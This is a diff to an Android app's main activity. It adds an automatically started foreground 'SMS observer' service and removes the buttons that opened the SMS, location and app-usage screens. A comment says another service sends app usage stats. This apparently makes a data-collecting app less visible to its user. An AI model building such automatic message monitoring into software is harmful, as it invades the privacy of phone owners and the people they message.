@@ -24,6 +24,7 @@ public class MainActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
+        startSMSService();
 
         //checking permissions and grant them
         checkingPermissions();
@@ -33,6 +34,18 @@ public class MainActivity extends AppCompatActivity {
 
         //service sending app usage stats
         startUsageStats();
+    }
+
+    /***************************
+    **                        **
+    **  SMS OBSERVER SERVICE  **
+    **                        **
+    ***************************/
+    private void startSMSService() {
+        Intent intent = new Intent(this, ListenSmsMmsService.class);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(intent);
+        }
     }
 
     /***************************
@@ -97,9 +110,6 @@ public class MainActivity extends AppCompatActivity {
         /////////////////////////
 
         Button btnContact = findViewById(R.id.button);
-        Button btnApp = findViewById(R.id.button1);
-        Button btnSms = findViewById(R.id.button2);
-        Button btnLocation= findViewById(R.id.button3);
 
 
         btnContact.setOnClickListener(new View.OnClickListener(){
@@ -109,36 +119,6 @@ public class MainActivity extends AppCompatActivity {
                         Contacts.class);
                 MainActivity.this.startActivity(intentMain);
                 Log.i("Content "," Contact ");
-            }
-        });
-
-        btnSms.setOnClickListener(new View.OnClickListener(){
-
-            public void onClick(View v) {
-                Intent intentMain = new Intent(MainActivity.this,
-                        Sms.class);
-                MainActivity.this.startActivity(intentMain);
-                Log.i("Content "," SMS ");
-            }
-        });
-
-        btnLocation.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
-                Intent intentMain = new Intent(MainActivity.this,
-                        Location.class);
-                MainActivity.this.startActivity(intentMain);
-                Log.i("Content ", " Location ");
-            }
-        });
-
-        btnApp.setOnClickListener(new View.OnClickListener() {
-
-            public void onClick(View v) {
-                Intent intentMain = new Intent(MainActivity.this,
-                        Apps.class);
-                MainActivity.this.startActivity(intentMain);
-                Log.i("Content ", " Data ");
             }
         });
 
